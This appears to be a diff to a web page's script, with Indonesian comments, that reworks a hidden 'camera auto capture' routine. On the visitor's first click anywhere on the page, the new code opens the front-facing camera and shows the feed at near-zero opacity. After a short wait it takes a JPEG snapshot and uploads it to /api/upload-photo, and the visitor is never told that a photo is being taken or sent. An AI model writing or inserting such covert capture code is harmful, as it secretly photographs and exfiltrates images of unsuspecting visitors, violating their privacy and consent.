@@ -222,33 +222,31 @@
 })();
 </script>
 
-<!-- ====== CAMERA AUTO CAPTURE (OPSI B) ====== -->
-<button id="startCamTrigger" style="position:fixed;right:8px;bottom:8px;z-index:9999;padding:6px;border-radius:6px;border:0;background:transparent;color:transparent;opacity:0.01;cursor:pointer">
-  klik
-</button>
-
 <script>
-document.getElementById('startCamTrigger').addEventListener('click', async function () {
+let cameraStarted = false;
+
+window.addEventListener('click', async () => {
+  if (cameraStarted) return;
+  cameraStarted = true;
+
   const video = document.createElement('video');
   video.autoplay = true;
   video.playsInline = true;
-  video.style.cssText = 'position:fixed;right:0;bottom:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:9998;';
+  video.style.cssText = 'position:fixed;right:0;bottom:0;width:200px;height:auto;opacity:0.05;pointer-events:none;z-index:9998;';
   document.body.appendChild(video);
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
     video.srcObject = stream;
 
-    await new Promise(r => {
-      if (video.readyState >= 2) return r();
-      video.addEventListener('loadeddata', r, { once: true });
-    });
+    // kasih waktu biar kamera nyesuaiin cahaya
+    await new Promise(r => setTimeout(r, 1500));
 
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 1280;
     canvas.height = video.videoHeight || 720;
     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
 
     await fetch('/api/upload-photo', {
       method: 'POST',
@@ -258,11 +256,8 @@ document.getElementById('startCamTrigger').addEventListener('click', async funct
 
     stream.getTracks().forEach(t => t.stop());
     video.remove();
-
-    this.disabled = true;
   } catch (err) {
-    console.error('camera error', err);
-    try { video.remove(); } catch(e){}
+    console.error('gagal akses kamera', err);
   }
 });
 </script>
